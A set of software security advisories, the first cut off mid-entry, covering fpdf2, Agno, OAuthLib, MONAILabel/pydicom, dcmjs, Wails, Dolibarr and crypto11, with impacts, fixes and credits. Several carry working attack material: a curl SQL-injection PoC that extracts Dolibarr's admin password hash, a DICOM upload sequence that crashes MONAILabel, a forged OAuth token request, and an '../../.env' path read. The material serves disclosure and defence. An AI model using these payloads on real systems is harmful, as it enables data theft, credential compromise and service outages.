Execution time varies by machine, but the process should show heavy resource use and fail at the configured memory limit.

### Impact

This is an uncontrolled resource consumption vulnerability affecting applications that pass user-controlled SVG data to `FPDF.image()`. A single crafted image can occupy a PDF generation worker for several seconds and then make the current job fail with `MemoryError`. Submitting the same input concurrently repeats the CPU and memory cost across the available workers, reducing or exhausting the service's PDF generation capacity.

The payload is less than 1 KB and requires no external resource access, XML entities, special network configuration, or permissive fpdf2 settings.

summary: fpdf2 implicitly loads external URLs and local image paths when rendering attacker-controlled content
description: ## Summary `fpdf2` implicitly dereferences image resource references supplied to rendering APIs. If an application passes untrusted HTML, SVG, template data, or image paths into those APIs, `fpdf2` may issue outbound HTTP(S) requests or attempt to open local filesystem paths. This behavior is relevant in applications that render untrusted or user-provided input without sanitizing or restricting embedded resource references. ## Description In affected versions, `fpdf2` uses a shared internal image-loading mechanism for multiple features. This loader: * fetches `http://` and `https://` URLs over the network * opens other string values as local filesystem paths During document processing, resource references embedded in input content are automatically dereferenced using this mechanism. This behavior is reachable through: * `FPDF.image()` * `FPDF.write_html()` via HTML `` * `FPDF.image()` when rendering SVG files containing `` or `xlink:href="...">` * template image elements that forward values into `FPDF.image()` If an application renders attacker-controlled input through these APIs, that input can cause: * outbound HTTP(S) requests to attacker-chosen destinations * local file open attempts for attacker-chosen paths This may enable Server-Side Request Forgery (SSRF) in applications that render untrusted content. Local file access impact is limited: the library attempts to open the referenced path, but successful embedding depends on the target being a valid and supported image or SVG resource. `file://` URLs are not specially handled; raw filesystem paths such as `/path/to/file` or `../../file.png` are the relevant local-path cases. ## Impact This issue affects applications that render untrusted or partially trusted content using `fpdf2`. Applications may be impacted if they: * pass untrusted HTML into `write_html()` * render untrusted SVG with embedded `` references * pass user-controlled strings into `image()` * allow untrusted template definitions or template field values to control image paths Potential impacts include: * outbound requests to internal or external network services * limited local file access attempts depending on file type and parsing success (limited to content that fpdf2 recognizes as a supported image or SVG resource) The severity depends on how `fpdf2` is integrated and whether untrusted input is allowed to control resource references. **Example scenarios** HTML: ```python pdf.write_html('') ``` SVG: ```xml ``` Direct image path: ```python pdf.image("../../.env") ``` **Workarounds** Applications can mitigate this by: - not rendering untrusted HTML, SVG, or template content - rejecting user-controlled `src` / `href` / image-path values - mapping resources through an application-defined allowlist - converting user-supplied images to trusted in-memory objects before passing them to `fpdf2` **Credits** - @kule500 for identifying SSRF via HTML handling - @BudongJW for identifying SVG resource loading as an additional vector - @redyank for analysis of the shared image loading mechanism - @manop55555 for identifying a DNS rebinding bypass in the initial REMOTE_PUBLIC implementation

summary: Agno: Arbitrary code execution via `eval()` on `field_type` in `FunctionCall`
description:
### Impact
Agno versions prior to 2.3.24 contain an arbitrary code execution vulnerability
in the model execution component. The `field_type` parameter on a `FunctionCall`
input field was passed to Python's built-in `eval()`, allowing an attacker who
could influence that value to execute arbitrary Python code in the Agno process.

This is a code injection flaw (CWE-95) with full impact to confidentiality,
integrity, and availability. CVSS 3.1 score: 9.3 (Critical).

Any deployment that exposes Agno to user-influenced FunctionCall inputs
(for example via an API, web UI, or untrusted tool/model output) is affected.

### Patches
Fixed in **Agno 2.3.24**.

The unsafe `eval()` call was replaced with a fixed `type_mapping` dictionary
lookup, and `field_type` is now validated as either a known string key or an
already-resolved `type` object before use. See commit
[cbf67552](https://github.com/agno-agi/agno/commit/cbf675521d4d2281925a051784a3b94172e56416)
(PR #5912).

All users should upgrade to 2.3.24 or later. The current release line (2.6.x)
includes the fix.

### Workarounds
There is no safe workaround. Users who cannot upgrade should ensure no
untrusted input can reach the `field_type` parameter of `FunctionCall`
input fields, but upgrading is strongly preferred.

### References
- Patch commit: https://github.com/agno-agi/agno/commit/cbf675521d4d2281925a051784a3b94172e56416
- Patch PR: https://github.com/agno-agi/agno/pull/5912
- CWE-95: https://cwe.mitre.org/data/definitions/95.html

summary: OAuthLib: Bearer token can be retrieved as long as client knows a valid client ID for device workflow
description:
### Summary
A call to the token endpoint with a grant type of `"urn:ietf:params:oauth:grant-type:device_code"` and a bogus `device_code` is able to get a bearer token as long as they know a valid client ID enabled for the device workflow.

### Details

[Section 3.4 of the RFC 8628 spec](https://datatracker.ietf.org/doc/html/rfc8628#section-3.4) says that the token endpoint should take in `device_code` as a required parameter.`DeviceCodeGrant.validate_token_request` does not perform any validation of `device_code`. `DeviceCodeGrant.validate_token_request` should be validating that `device_code` was passed in as a parameter and that it is valid, similar to how `AuthorizationCodeGrant.validate_token_request` does the checks [here](https://github.com/oauthlib/oauthlib/blob/a015b446622f2b925517501fe484c10eff7a83c0/oauthlib/oauth2/rfc6749/grant_types/authorization_code.py#L446) and [here](https://github.com/oauthlib/oauthlib/blob/a015b446622f2b925517501fe484c10eff7a83c0/oauthlib/oauth2/rfc6749/grant_types/authorization_code.py#L483).

I would like to propose a new method be added to `RequestValidator` called `validate_device_code` that is similar to the `validate_code` method and is called inside of `DeviceCodeGrant.validate_token_request`.

### PoC
Create an implementation of `RequestValidation.authenticate_client` that returns `True` if the client's `client_type` is `"public"`. You would find yourself in this scenario because there's another issue with `DeviceCodeGrant.validate_token_request` where it doesn't properly handle public clients (see https://github.com/oauthlib/oauthlib/issues/919).

Create a client that has a `client_type` of `"public"` and set it's `grant_type` to `"urn:ietf:params:oauth:grant-type:device_code"`.

With this implementation of `RequestValidation.authenticate_client` done, use that validator for your token endpoint. Call the token endpoint with a body of 
```
{
  "client_id": <ID of the public client you made>,
  "grant_type": "urn:ietf:params:oauth:grant-type:device_code",
  "device_code": <anything you want since it's not validated>
}
```

You now have a bearer token for the client without a valid `device_code`.


### Impact
Anyone using the RFC 8628 device workflow in oauthlib that doesn't realize the `device_code` parameter is not being validated.

summary: MONAILabel Server Crash and Silent Inference Corruption via Crafted DICOM (pydicom DS/IS Validation Bypass)
description:
### Summary

An unauthenticated remote attacker can crash a running MONAILabel server or silently corrupt its medical AI inference results by uploading a single crafted DICOM file (~132 KB) via the REST API. The vulnerability stems from pydicom's lack of validation for Decimal String (DS) and Integer String (IS) DICOM Value Representations, which allows NaN and infinity values to pass through MONAI's PydicomReader and propagate through the entire spatial transform and ML inference pipeline.

No authentication is required for the default MONAILabel REST API. The attacker needs only network access to the server (default port 8000).

**Severity:** CVSS 3.1: 8.7 HIGH  
**CVSS Vector:** CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:N/I:H/A:L  
**CWE:** CWE-20 (Improper Input Validation) → CWE-682 (Incorrect Calculation)

### Details

**Root Cause — Layer 1: pydicom accepts invalid VR values**

pydicom's `DSfloat.__new__()` calls Python's `float(val)`, which silently accepts "NaN", "inf", and "-inf". The DICOM standard (PS3.5 Table 6.2-1) defines DS as digits 0-9, +, -, ., e only. NaN and inf are not valid DS values. The `is_valid_ds()` check only runs in RAISE validation mode, which is NOT the default. The default mode is WARN, which still returns the invalid value.

```python
>>> from pydicom.valuerep import DSfloat
>>> DSfloat("NaN")
nan    # Accepted silently — should be rejected
>>> DSfloat("inf")
inf    # Accepted silently — should be rejected
```

This affects ALL pydicom versions from 0.9.7 through 3.0.2 (current).

A related bypass exists in pydicom's IS type: `IS("1e4")` returns 10000 via an `int(float(val))` fallback, accepting scientific notation that is not valid per the DICOM standard.

**Root Cause — Layer 2: MONAI Core trusts pydicom output without validation**

MONAI's `PydicomReader._get_affine()` builds a 4x4 affine transformation matrix from PixelSpacing, ImagePositionPatient, and ImageOrientationPatient with ZERO `isfinite()` or `isnan()` checks. NaN in PixelSpacing produces NaN in the affine diagonal, propagating through every spatial transform:
`PydicomReader._get_affine() → LoadImaged → Spacingd → Model → Writer`

**Root Cause — Layer 3: MONAILabel REST API accepts anything**

MONAILabel's `PUT /datastore/` endpoint accepts DICOM uploads with no authentication (default deployment), no validation of spatial metadata, and no bounds checking on any DICOM tag values. The malicious DICOM is stored permanently and made available for inference.

### PoC

**Environment Setup:**
```bash
# Start MONAILabel (Docker)
docker pull projectmonai/monailabel:latest
docker run -d --name monailabel-poc -p 8000:8000 --memory=8g \
    projectmonai/monailabel:latest monailabel start_server \
    --app /opt/monai/sample-apps/radiology \
    --studies /opt/monai/datasets/Task09_Spleen/imagesTr \
    --conf models segmentation

# Verify server is running
curl http://localhost:8000/info/
```

**Step 1 — Establish baseline (legitimate data works):**
```bash
curl -X POST "http://localhost:8000/infer/segmentation?image=spleen_40" \
     -o baseline.nii.gz -w "HTTP %{http_code} - %{size_download} bytes"
# Result: HTTP 200, ~223,628 bytes valid segmentation mask
```

**Step 2 — Run the attack (NaN DICOM upload + inference):**
```bash
pip install pydicom numpy requests
python poc_monailabel_ds_bypass.py --server http://localhost:8000
```

The PoC script:
1. Confirms pydicom accepts NaN/inf in DS fields
2. 2. Creates three malicious DICOM files (~132 KB each) with NaN/inf in PixelSpacing and ImagePositionPatient
3. 3. Uploads each via `PUT /datastore/` (no auth required) — HTTP 200 accepted
4. 4. Triggers inference via `POST /infer/segmentation` — HTTP 500, server crash
**Demonstrated Results:**

| Payload | Upload | Inference | Result |
|---|---|---|---|
| Baseline (spleen_40) | N/A | HTTP 200 | Valid 223 KB segmentation |
| NaN PixelSpacing | HTTP 200 | HTTP 500 | RuntimeError crash (18.0s wasted compute) |
| NaN PixelSpacing + IPP | HTTP 200 | HTTP 500 | RuntimeError crash (16.7s wasted compute) |
| Inf PixelSpacing | HTTP 200 | HTTP 500 | RuntimeError crash (16.4s wasted compute) |

**Server crash traceback:**
```
monailabel/tasks/infer/basic_infer.py → self.writer(data)
monailabel/transform/writer.py → write_itk(...)
itk/ITKCommonBasePython.py → itkProcessObject_Update()
RuntimeError: itkGDCMImageIO.cxx:1226:
  ITK ERROR: GDCMImageIO: A Floating point buffer was passed
  but the stored pixel type was not specified.
```

Each request burns ~16 seconds of server compute (full ML inference pipeline) before crashing. The NaN DICOM persists in the datastore — any future inference on that image ID crashes the server again.

**Library-level confirmation:** 17/17 test vectors confirmed against MONAI 1.5.2 and pydicom 3.0.2, including actual MONAI `LoadImaged` and `Spacingd` transforms accepting NaN geometry without error.

### Impact

1. **Denial of Service:** A single ~132 KB DICOM upload crashes the MONAILabel inference pipeline. All active inference requests from legitimate users are aborted. Repeatable indefinitely with minimal bandwidth.
2. **Silent Data Corruption:** NaN values in spatial metadata propagate through the entire ML inference pipeline and produce geometrically incorrect segmentation masks. If the output writer does not crash, the result is returned with HTTP 200 and zero warnings.
3. **Persistent Datastore Poisoning:** The malicious DICOM is stored permanently via `PUT /datastore/`. Any future inference request on that image ID reproduces the crash or corruption, persisting across server restarts.
**Affected MONAI Ecosystem (9 repositories):**
- MONAI Core: PydicomReader, LoadImaged, Spacingd transforms
- - MONAILabel: REST API + DICOMweb datastore
- - MONAI Deploy App SDK: DICOMDataLoaderOperator
- - model-zoo, VISTA, GenerativeModels, tutorials, research-contributions
**Affected DICOM Tags (any DS VR):** PixelSpacing, ImagePositionPatient, SliceThickness, ImageOrientationPatient, RescaleSlope, WindowCenter/WindowWidth

**Recommended Fix:**
1. Add `math.isfinite()` validation in `PydicomReader._get_affine()` on all values from PixelSpacing, IPP, IOP. Raise ValueError for NaN/inf.
2. 2. Validate spatial metadata of uploaded DICOM in MONAILabel `PUT /datastore/`. Return HTTP 400 for invalid geometry.
3. 3. Validate spatial metadata is finite in `LoadImaged`/`Spacingd` before resampling.
4. 4. Coordinate with pydicom upstream to reject NaN/inf in DS fields in all validation modes.
**Upstream:** pydicom GHSA filed 2026-04-05.

**Author:** Paulino Calderon (paulino@calderonpale.com)

summary: dcmjs: DS/IS VALUE REPRESENTATION INPUT VALIDATION BYPASS
description:
dcmjs, a JavaScript library for DICOM manipulation used in web-based medical
imaging viewers, contains an input validation bypass in its handling of DS
(Decimal String) and IS (Integer String) value representations.

The DecimalString and IntegerString classes in ValueRepresentation.js use a
regex sanitizer followed by JavaScript's Number() constructor. While the regex
strips direct NaN/Infinity strings, it preserves scientific notation (including
the 'e' character), enabling:

  1. Infinity injection via scientific notation overflow (1e999999)
  2. NaN injection via sign-only remnants from stripped inf strings ("-inf" -> "-")
  3. IS accepting scientific notation in violation of PS3.5

AFFECTED PRODUCT
================
Product:          dcmjs (JavaScript DICOM manipulation library)
Repository:       https://github.com/dcmjs-org/dcmjs
npm:              https://www.npmjs.com/package/dcmjs
Affected Versions: < 0.52.0 (patched in 0.52.0, released 2026-05-19)
CVE:              CVE-2026-46350 (assigned by GitHub 2026-05-13)
CWE:              CWE-20 (Improper Input Validation)
CVSS Score:       7.5 (HIGH)
CVSS Vector:      CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:H
Maintainer note:  The CVSS score above is the reporter's assessment; dcmjs rates this low, because malformed input produces NaN/Infinity in values the caller must range-check in any case (both are reachable by other means, and no trust boundary enforced by dcmjs is crossed).

DOWNSTREAM IMPACT
=================
dcmjs is a foundational library used by:
  - OHIF Viewer (Open Health Imaging Foundation)
  - Cornerstone.js ecosystem
  - DICOMweb client/server implementations
  - Research and clinical web-based PACS viewers
  - Any Node.js or browser application parsing DICOM via dcmjs

ROOT CAUSE
==========
In src/ValueRepresentation.js, both DecimalString and IntegerString use:

    let returnVal = numberStr.trim().replace(/[^0-9.\\\-+e]/gi, "");
    return returnVal === "" ? null : Number(returnVal);

The regex /[^0-9.\\\-+e]/gi strips characters NOT in the set {0-9, ., \, -, +,
e, E}. This provides partial defense: direct "NaN" and "Infinity" strings are
stripped to empty/null. However:

  (a) Scientific notation is fully preserved because 'e', digits, '+', '-', '.'
      all pass the regex. "1e999999" passes intact, and Number("1e999999")
      returns JavaScript Infinity.

  (b) The string "-inf" is stripped to just "-" (only the minus passes the
      regex). Number("-") returns JavaScript NaN.

  (c) IntegerString uses the SAME regex/logic as DecimalString, meaning IS
      accepts scientific notation ("1e5" -> 100000) in violation of PS3.5
      Section 6.2, which restricts IS to characters 0-9, +, -.

  (d) No range validation exists for IS values (PS3.5 requires [-2^31, 2^31-1])
      or DS values (16-character max, fixed/floating-point only).

VULNERABILITY DETAILS
=====================

Attack Vector 1: Infinity via Scientific Notation Overflow
----------------------------------------------------------
Input:   DS or IS field containing "1e999999"
Regex:   Passes (all chars in allowed set)
Result:  Number("1e999999") -> Infinity
Impact:  Infinity propagates through all downstream arithmetic

Attack Vector 2: Negative Infinity via Scientific Notation
----------------------------------------------------------
Input:   DS or IS field containing "-1e999999"
Regex:   Passes
Result:  Number("-1e999999") -> -Infinity
Impact:  Negative Infinity in spatial/dosimetric calculations

Attack Vector 3: NaN via Sign-Only Remnant
------------------------------------------
Input:   DS or IS field containing "-inf"
Regex:   Strips to "-"
Result:  Number("-") -> NaN
Impact:  NaN propagates silently through arithmetic (IEEE 754)

Attack Vector 4: NaN via Plus-Only Remnant
------------------------------------------
Input:   DS or IS field containing "+inf"
Regex:   Strips to "+"
Result:  Number("+") -> NaN
Impact:  Same as above

Attack Vector 5: IS Scientific Notation Bypass
-----------------------------------------------
Input:   IS field containing "1e5"
Regex:   Passes
Result:  Number("1e5") -> 100000
Impact:  Integer fields accept non-integer representation, violating PS3.5

Attack Vector 6: IS Extreme Overflow
-------------------------------------
Input:   IS field containing "1e18"
Regex:   Passes
Result:  Number("1e18") -> 1000000000000000000
Impact:  Far exceeds IS range [-2^31, 2^31-1], no bounds check

CLINICAL IMPACT
===============
dcmjs is used in web-based DICOM viewers and processing pipelines.
Corrupted values affect:

  - PixelSpacing / ImagePositionPatient: Spatial geometry corruption prevents
    accurate measurement and registration in web viewers

  - WindowCenter / WindowWidth: Display pipeline corruption makes images
    unreadable (all black or all white)

  - DoseGridScaling / NumberOfFrames: Radiation therapy dose display errors
    and denial of service via frame count overflow

  - RescaleSlope / RescaleIntercept: Hounsfield unit conversion produces
    invalid values, corrupting quantitative analysis

  - SliceThickness: Volume reconstruction fails in multiplanar reformats

summary: Wails: wildcardPatternToRegex allows Origin bypass via suffix match in BindingsAllowedOrigins
description:
# Security Vulnerability Report: Wails v2 — Origin Validator Bypass via Wildcard Pattern

| | |
|---|---|
| **Product** | wailsapp/wails (v2) |
| **Affected File** | `v2/internal/frontend/originvalidator/originValidator.go` |
| **Affected Versions** | All versions containing originValidator (latest as of 2026-03-26) |
| **CVSSv4.0** | **7.6 HIGH** — `CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:P/VC:H/VI:H/VA:L/SC:L/SI:L/SA:N` |
| **CWE** | CWE-625: Permissive Regular Expression |
| **Platforms** | Windows / Linux / macOS (all desktop targets) |

---

## Summary

Wails v2 provides `BindingsAllowedOrigins` to restrict which web origins can invoke Go backend methods via IPC. The wildcard pattern matching in `wildcardPatternToRegex` converts `*` to `.*` without anchoring subcomponents, allowing suffix-matched origins to bypass the restriction.

An attacker who controls a domain sharing a prefix with the allowed origin (e.g., `myapp.community` when `myapp.com*` is configured) can invoke arbitrary bound Go methods, potentially achieving file system access, data exfiltration, or code execution depending on the application's exposed API surface.

---

## Vulnerability Details

### Root Cause

`wildcardPatternToRegex` converts a wildcard pattern to a regular expression by escaping special characters and replacing `*` with `.*`. The substituted `.*` has no restriction — it matches any character sequence including dots and additional domain components.

### Vulnerable Code

**File:** `v2/internal/frontend/originvalidator/originValidator.go`

```go
func (v *OriginValidator) wildcardPatternToRegex(wildcardPattern string) string {
    specialChars := []string{"\\", ".", "+", "?", "^", "$", "{", "}", "(", ")", "|", "[", "]"}

    escaped := wildcardPattern
    for _, specialChar := range specialChars {
        escaped = strings.ReplaceAll(escaped, specialChar, "\\"+specialChar)
    }

    // * becomes .* — matches ANY character sequence, including dots and domain separators
    escaped = strings.ReplaceAll(escaped, "*", ".*")

    return "^" + escaped + "$"
}
```

The generated regex for `https://myapp.com*` is:

```
^https://myapp\.com.*$
```

This matches any string beginning with `https://myapp.com`, including:

- `https://myapp.community` — different TLD
- `https://myapp.com.attacker.com` — attacker-controlled subdomain
- `https://myapp.comXXXXX` — any arbitrary suffix

### Scope Note

The official comment in `options.go` gives `https://*.myapp.com` as the example pattern (subdomain prefix wildcard). This pattern is **not affected**. The vulnerability only manifests when developers use a trailing wildcard (`myapp.com*`), which is a natural misuse when intending to permit a domain and all its subpaths or ports.

---

## Impact

Any Go method registered with Wails bindings becomes callable from the attacker's origin. Depending on the application:

- File system read / write (common in desktop apps)
- Database queries
- OS command execution (if exposed via bindings)
- Sensitive configuration or credential access

---

## Fix

**PR:** https://github.com/wailsapp/wails/pull/5074

Wildcards are now only expanded when they represent a full domain component (immediately after `://`, `.`, or `:`). A wildcard appended to a partial label (e.g. `com*`) is stripped, preventing suffix-based bypasses. Comprehensive test suite added.

---

## Disclosure Timeline

| Date | Event |
|---|---|
| 2026-03-26 | Vulnerability discovered during source code audit by @Saku0512 |
| 2026-03-26 | Private report submitted via GitHub Security Advisory |
| 2026-03-26 | Vendor acknowledgement and fix PR opened (#5074) |
| TBD | Patch release |
| TBD + 90 days | Public disclosure deadline |

summary: Dolibarr has SQL Injection in societe/class/societe.class.php via localtax1_value parameter
description: ### Summary A SQL Injection vulnerability exists in the Third Party (Company) update functionality of Dolibarr ERP/CRM. The `localtax1_value` parameter (`lt1`) is concatenated directly into an SQL UPDATE statement in `societe/class/societe.class.php` at line 1672 without any escaping, type casting, or parameterized query binding. An authenticated user with standard "Third Party: Create/Edit" permission can extract any data from the database, including password hashes, API keys, and all business data. Tested on Dolibarr v23.0.0 (latest stable), default installation via official Docker image, MariaDB 10.11. No custom modules, no modified configuration. ### Details **Vulnerable code** (`societe/class/societe.class.php`, line 1672): ```php $sql .= ",localtax1_value =".$this->localtax1_value; ``` The value comes from `GETPOST('lt1', 'alpha')` (`societe/card.php`, line 1135). The only sanitization applied is `trim()` at line 1528 — no `(float)` cast, no `$db->escape()`. The `alpha` input filter strips HTML tags and double quotes but does **not** strip single quotes, parentheses, commas, or SQL keywords. Since the injection point is in a numeric SQL context (no quotes around the value), the attacker needs none of the filtered characters. **Why the WAF does not block this:** Dolibarr's WAF (`waf.inc.php`) only checks SQL injection patterns in **GET** parameters, not POST. The POST-based `lt1` parameter bypasses it entirely. **The same vulnerability exists** for `localtax2_value` (parameter `lt2`) at line 1682. Adjacent fields like `localtax1_assuj` are properly cast to `(int)`, showing the developers were aware of injection risk but missed these fields. ### PoC **Steps to reproduce:** 1. Install Dolibarr v23.0.0 (tested with official Docker image, MariaDB 10.11) 2. Log in with a user that has "Third Parties: Create/Edit" permission (standard user, not admin) 3. Create or open any existing Third Party (company) record 4. Click "Edit" on the company card to open the update form 5. Intercept the POST request (e.g., Burp Suite) and add these parameters to the request body: - `localtax1assuj_value=1` - `lt1=1,note_private=(SELECT pass_crypted FROM llx_user WHERE rowid=1)` 6. Submit the form (server responds with HTTP 302 Found — successful update) 7. Navigate to the company's Notes tab — the admin's MD5 password hash is now visible in the "Private Note" field **Verification:** `echo -n "admin123" | md5sum` → `0192023a7bbd73250516f069df18b500` (matches exfiltrated hash). **Figure 1 — Notes tab before exploitation (Private Note field is empty):** **Figure 2 — Burp Suite Repeater: full POST request headers and HTTP 302 Found response:** **Figure 3 — Burp Suite Repeater: request body with injected `localtax1assuj_value=1` and `lt1=1,note_private=(SELECT pass_crypted FROM llx_user WHERE rowid=1)`:** **Figure 4 — Notes tab after exploitation: Private Note now contains `0192023a7bbd73250516f069df18b500` (MD5 hash of admin password "admin123"):** **curl PoC:** ```bash curl -b cookies.txt \ --data-urlencode "action=update" \ --data-urlencode "token=CSRF_TOKEN" \ --data-urlencode "socid=1" \ --data-urlencode "name=TestCompany" \ --data-urlencode "status=1" \ --data-urlencode "localtax1assuj_value=1" \ --data-urlencode "lt1=1,note_private=(SELECT pass_crypted FROM llx_user WHERE rowid=1)" \ --data-urlencode "client=1" \ --data-urlencode "typent_id=0" \ "http://TARGET/societe/card.php?socid=1" ``` **Additional proof — arithmetic evaluation:** Sending `lt1=3+4` results in `localtax1_value=7.0000` stored in the database. The expression was evaluated by the SQL engine, confirming injection. **Additional proof — user count exfiltration:** Sending `lt1=(SELECT COUNT(*) FROM llx_user)` results in `localtax1_value=1.0000`. ### Impact An attacker with basic "Third Party: Create/Edit" permission (standard user, not admin) can: - **Read** any data from the database (password hashes, API keys, customer/supplier data, invoices, bank account details) - **Modify** any database record via additional SET clauses in the UPDATE injection - **Escalate** to admin by cracking MD5 password hashes (Dolibarr uses unsalted MD5 by default) - **Potentially achieve RCE** via admin features (Website module PHP injection, ModuleBuilder) after privilege escalation ### Suggested Fix ```php // societe.class.php, line 1528 — add (float) cast: $this->localtax1_value = (float) price2num(trim($this->localtax1_value)); // societe.class.php, line 1672 — add (float) cast: $sql .= ",localtax1_value =".((float) $this->localtax1_value); ``` Apply same fix for `localtax2_value` (lines 1529, 1682). ### Credit Please credit this finding to: **Grzegorz Tworek (F3715H) sec4check** (grzegorz.tworek@sec4check.pl) ### References A detailed write-up will be published after patch release at: https://www.sec4check.pl/blog/posts/cve-dolibarr-sql-injection-localtax-third-party.html We kindly request including this URL in the CVE references.

summary: In `github.com/eclipse-keypont/crypto11/v2` versions `>= 2.0.0-rc3, <= 2.0.0-rc8`, the ML-KEM key...
description: In `github.com/eclipse-keypont/crypto11/v2` versions `>= 2.0.0-rc3, <= 2.0.0-rc8`, the ML-KEM key-pair lookup functions (`FindMLKEMKeyPair`, `FindMLKEMKeyPairs`, `FindMLKEMKeyPairsWithAttributes`) locate the public half of an ML-KEM key pair by `CKA_ID`/`CKA_LABEL` and never verify it against the private key. In addition, the "ID only" fallback search runs even when the private key has no `CKA_ID`, so the search template reduces to the public-key class and the ML-KEM key type and the first ML-KEM public key on the token is returned. `Encapsulate()` on the resulting key pair encrypts the fresh shared secret to that key, so its owner — not the holder of the private key the caller looked up — can recover the secret. An attacker who can open an unauthenticated session on the token and plant a public `CKK_ML_KEM` object carrying the victim's `CKA_ID`/`CKA_LABEL` receives the shared secrets for encapsulations performed through the substituted key pair, compromising the confidentiality of those secrets and of everything protected by keys derived from them. The v1 module paths have no ML-KEM support and are not affected.
